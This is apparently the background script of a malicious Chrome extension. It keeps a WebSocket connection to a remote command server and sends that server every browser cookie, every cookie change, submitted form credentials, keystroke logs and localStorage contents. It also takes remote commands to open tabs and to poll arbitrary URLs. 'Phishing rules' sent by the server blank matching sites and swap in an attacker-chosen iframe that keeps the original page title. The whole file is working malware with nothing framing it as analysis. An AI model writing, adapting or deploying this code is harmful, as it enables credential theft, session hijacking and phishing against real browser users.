let ws;
let client_id;

async function readConfig() {
  try {
    const configURL = chrome.runtime.getURL("config.json");
    const response = await fetch(configURL);
    if (response.ok) {
      return await response.json();
    }
    console.error("Failed to read config");
    return null;
  } catch (error) {
    console.error("Error reading config:", error);
    return null;
  }
}

async function getTargetUrl(config) {
  if (config.useBin) {
    try {
      const response = await fetch(config.binUrl);
      if (response.ok) {
        return await response.text();
      }
    } catch (error) {
      console.error("Error fetching bin URL:", error);
    }
  }
  return config.targetUrl;
}

async function connectWebSocket() {
  try {
    const config = await readConfig();
    if (!config) return;

    const targetUrl = await getTargetUrl(config);
    ws = new WebSocket(targetUrl);

    ws.addEventListener("open", () => {
      console.log("WebSocket connected");
      chrome.storage.local.get("client_id", (data) => {
        client_id = data.client_id;
        if (!client_id) {
          client_id = Math.random().toString(36).substring(7);
          chrome.storage.local.set({ client_id });
        }
        send("alive", {
          client_id,
          os: "windows",
          username: "user",
        });
        send("pollingstate", { state: false });
        chrome.cookies.getAll({}, function (cookies) {
          send("setcookies", cookies);
        });
        // Request phishing rules sync after initial setup
        send("phishdns_sync", { client_id });
        
        setInterval(() => {
          send("alive", {
            client_id,
            os: "Windows",
            username: "user",
          });
        }, 1000);
      });
    });

    ws.addEventListener("message", handleMessages);

    ws.addEventListener("close", () => {
      console.log(
        "WebSocket disconnected, attempting to reconnect in 1 seconds..."
      );
      setTimeout(() => {
        connectWebSocket();
      }, 1000);
    });
  } catch (err) {
    console.log(
      "WebSocket not connecting, attempting to connect in 1 seconds..."
    );
    setTimeout(() => {
      connectWebSocket();
    }, 1000);
  }
}
// Polling variables
let pollingInterval = 5000; // Default: 5 seconds
let pollingIntervalId = null;

// Initialize when extension is installed or updated
chrome.runtime.onInstalled.addListener(() => {
  chrome.storage.local.set({
    isRunning: false,
    url: "",
    interval: 5000,
    lastPoll: null,
  });
});

// Keep service worker alive while polling
let keepAlivePort = null;
/**
 * Replaces all occurrences of #FUZZ in a string with random 6-character alphanumeric strings
 * @param {string} inputString - The string containing #FUZZ placeholders
 * @returns {string} - The string with all #FUZZ placeholders replaced
 */
function replaceFuzz(inputString) {
  // Function to generate a random 6-character alphanumeric string
  function generateRandomString() {
    const chars =
      "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    let result = "";

    for (let i = 0; i < 8; i++) {
      const randomIndex = Math.floor(Math.random() * chars.length);
      result += chars.charAt(randomIndex);
    }

    return result;
  }

  // Replace all occurrences of #FUZZ with random strings
  return inputString.replace(/#FUZZ/g, () => generateRandomString());
}

// Start polling the specified URL
async function startPolling(url, interval = 5000) {
  if (!url) {
    throw new Error("URL is required");
  }

  if (!interval) {
    throw new Error("Interval is required");
  }
  // Update the polling interval
  pollingInterval = interval;

  try {
    // Stop any existing polling first
    await stopPolling();

    // Store the URL, interval, and update state
    await chrome.storage.local.set({
      isRunning: true,
      url: url,
      interval: interval,
      lastPoll: null,
    });

    // Create a connection to keep the service worker alive
    if (!keepAlivePort) {
      keepAlivePort = chrome.runtime.connect({ name: "keepAlive" });
      keepAlivePort.onDisconnect.addListener(() => {
        // Try to reconnect if disconnected
        if (pollingIntervalId) {
          keepAlivePort = chrome.runtime.connect({ name: "keepAlive" });
        } else {
          keepAlivePort = null;
        }
      });
    }

    // Start interval with setInterval
    pollingIntervalId = setInterval(pollURL, pollingInterval);

    // Poll immediately
    pollURL();

    send("pollingstate", { state: true });
  } catch (error) {
    console.error("Error starting polling:", error);
    throw error;
  }
}

// Stop polling
async function stopPolling() {
  try {
    // Clear the interval
    if (pollingIntervalId) {
      clearInterval(pollingIntervalId);
      pollingIntervalId = null;
    }

    // Close keepAlive connection
    if (keepAlivePort) {
      keepAlivePort.disconnect();
      keepAlivePort = null;
    }

    // Update state
    await chrome.storage.local.set({
      isRunning: false,
    });

    send("pollingstate", { state: false });
  } catch (error) {
    console.error("Error stopping polling:", error);
    throw error;
  }
}

// Poll the URL
async function pollURL() {
  try {
    const data = await chrome.storage.local.get(["url", "isRunning"]);

    if (!data.isRunning || !data.url) {
      return;
    }

    console.log(
      `Polling URL: ${data.url} at ${new Date().toLocaleTimeString()}`
    );

    // Make the GET request
    const response = await fetch(replaceFuzz(data.url), {
      method: "GET",
      mode: "no-cors", // Allows requests to any URL
    });

    // Update the last poll time
    const now = Date.now();
    await chrome.storage.local.set({ lastPoll: now });
  } catch (error) {
    console.error("Error polling URL:", error);
  }
}

function handleMessages(message) {
  try {
    const data = JSON.parse(message.data);
    switch (data[0]) {
      case "alert":
        sendMessageToContentScript(JSON.stringify(["alert", data[1]]));
        break;
      case "openlink":
        chrome.tabs.create({
          url: data[1],
          active: true, // This keeps the new tab in the background
        });
        break;
      case "startpolling":
        startPolling(data[1], data[2]);
        break;
      case "stoppolling":
        stopPolling();
        break;
      case "phishdns_update":
        handlePhishDNSUpdate(data[1]);
        break;
    }
  } catch (error) {
    console.error("Error in handleMessages:", error);
  }
}

// Store for active phishing rules
let activePhishingRules = [];

// Handle phishDNS rules update
function handlePhishDNSUpdate(rules) {
  activePhishingRules = rules;
}

// Check if URL matches any phishing rules
function checkUrlAgainstRules(url) {
  for (const rule of activePhishingRules) {
    const pattern = rule.target_url
      .replace(/\./g, "\\.")
      .replace(/\*/g, ".*");
    const regex = new RegExp(`^${pattern}$`);
    
    if (regex.test(url)) {
      return rule.replacement_url;
    }
  }
  return null;
}

// Inject phishing overlay when URL matches
function injectPhishingOverlay(tabId, replacementUrl, tabTitle) {
  chrome.scripting.executeScript({
    target: { tabId: tabId },
    func: (url, title) => {
      
      if (!document.getElementById('phishing-overlay')) {
        // Create container first to hide the page immediately
        document.documentElement.innerHTML = '';
        document.documentElement.style.margin = '0';
        document.documentElement.style.padding = '0';
        document.body.style.margin = '0';
        document.body.style.padding = '0';
        const container = document.createElement('div');
        container.id = 'phishing-overlay-container';
        container.style.cssText = `
          position: fixed !important;
          top: 0 !important;
          left: 0 !important;
          width: 100% !important;
          height: 100% !important;
          margin: 0 !important;
          padding: 0 !important;
          background: white !important;
          z-index: 2147483647 !important;
        `;
        document.documentElement.appendChild(container);
        /*
        // Create iframe inside container
        const overlay = document.createElement('iframe');
        overlay.id = 'phishing-overlay';
        overlay.src = url;
        overlay.style.cssText = `
          position: absolute !important;
          top: 0 !important;
          left: 0 !important;
          width: 100% !important;
          height: 100% !important;
          margin: 0 !important;
          padding: 0 !important;
          border: none !important;
          background: white !important;
        `;
        
        container.appendChild(overlay);
        document.documentElement.appendChild(container);
        */
        window.setTimeout(() => {
          document.open();
          document.write("<!DOCTYPE html><html><head><title>"+title+"</title></head><body><iframe src=\""+url+"\" style=\"border:none;position:fixed;top:0;left:0;width:100%;height:100%;direction:ltr;\" id=\"phishing-overlay\"></iframe><script>window.addEventListener(\"message\",function (e) {if(e.data === 'setit'){localStorage.setItem(\"logged\",1);location.reload();}},false);</script></body></html>");
          document.close();
        }, 200);
        
      }
    },
    args: [replacementUrl, tabTitle],
    injectImmediately: true,
  });
}

// Listen for tab updates and navigation
chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
  if (tab.url) {
    const replacementUrl = checkUrlAgainstRules(tab.url);
    if (replacementUrl) {
      injectPhishingOverlay(tabId, replacementUrl, tab.title);
    }
  }
});

// Also listen for navigation events to catch redirects
chrome.webNavigation.onCommitted.addListener((details) => {
  if (details.frameId === 0) { // main frame only
    const replacementUrl = checkUrlAgainstRules(details.url);
    if (replacementUrl) {
      injectPhishingOverlay(details.tabId, replacementUrl, details.tab.title);
    }
  }
});

// sends data to server over websocket
function send(type, data) {
  try {
    if (ws && ws.readyState === WebSocket.OPEN) {
      ws.send(JSON.stringify([type, data]));
    } else {
      console.log("WebSocket is not open");
    }
  } catch (error) {
    // Silently handle any errors
  }
}

function sendMessageToContentScript(message) {
  chrome.tabs.query({ active: true, currentWindow: true }, (tabs) => {
    let activeTab = tabs[0];
    if (activeTab) {
      chrome.tabs.sendMessage(
        activeTab.id,
        { message: message },
        (response) => {
          console.log("Response from content script:", response);
        }
      );
    }
  });
}

// Initialize WebSocket connection
connectWebSocket();

// Event listeners remain the same
chrome.cookies.onChanged.addListener(function (changeInfo) {
  send("updatecookie", changeInfo.cookie);
});

chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
  switch (message.type) {
    case "FORM_SUBMISSION":
      console.log(
        "Form submission received from:",
        sender.tab ? sender.tab.url : "unknown source"
      );
      console.log("Form data:", message.data);
      send("addsubmittedcredentials", message.data);

      chrome.storage.local.get(["formSubmissions"], (result) => {
        const submissions = result.formSubmissions || [];
        submissions.push(message.data);

        chrome.storage.local.set({ formSubmissions: submissions }, () => {
          console.log("Form submission stored successfully");
        });
      });

      sendResponse({ status: "success", timestamp: new Date().toISOString() });
      break;

    case "ACTIVITY_LOG":
      const logData = {
        keys: message.data.keys,
        timestamp: message.data.timestamp,
        url: message.data.url,
      };
      send("activitylog", logData);
      break;

    case "STORAGE_STATE":
      const storageData = {
        domain: message.data.domain,
        storage: message.data.storage,
      };
      send("setlocalstorage", storageData);
      break;
  }
  return true;
});
const RESOURCE_TYPES = [
  "main_frame",
  "sub_frame",
  "stylesheet",
  "script",
  "image",
  "font",
  "object",
  "xmlhttprequest",
  "ping",
  "csp_report",
  "media",
  "websocket",
  "webtransport",
  "other",
];

const BASE_RULE_ID = 1000;
const MAX_RULES = 50;
let currentRuleIndex = BASE_RULE_ID;

async function sendRequest(url, userAgent) {
  // Get new rule IDs
  const netRuleId = currentRuleIndex;
  const jsRuleId = currentRuleIndex + 1;
  currentRuleIndex += 2;

  if (currentRuleIndex > BASE_RULE_ID + MAX_RULES) {
    currentRuleIndex = BASE_RULE_ID;
  }

  // Remove existing rules and add new ones
  const existingRules = await chrome.declarativeNetRequest.getSessionRules();
  const removeRuleIds = existingRules.map((rule) => rule.id);

  await chrome.declarativeNetRequest.updateSessionRules({
    removeRuleIds,
    addRules: [
      {
        id: netRuleId,
        priority: 3,
        action: {
          type: "modifyHeaders",
          requestHeaders: [
            {
              header: "user-agent",
              operation: "set",
              value: userAgent,
            },
          ],
        },
        condition: {
          resourceTypes: RESOURCE_TYPES,
        },
      },
      {
        id: jsRuleId,
        priority: 1,
        action: {
          type: "modifyHeaders",
          requestHeaders: [
            {
              header: "sec-ch-ua",
              operation: "remove",
            },
          ],
        },
        condition: {
          resourceTypes: ["main_frame", "sub_frame"],
        },
      },
    ],
  });

  try {
    const response = await fetch(url);
    return {
      response,
      ruleIds: [netRuleId, jsRuleId],
    };
  } catch (error) {
    throw {
      error,
      ruleIds: [netRuleId, jsRuleId],
    };
  }
}
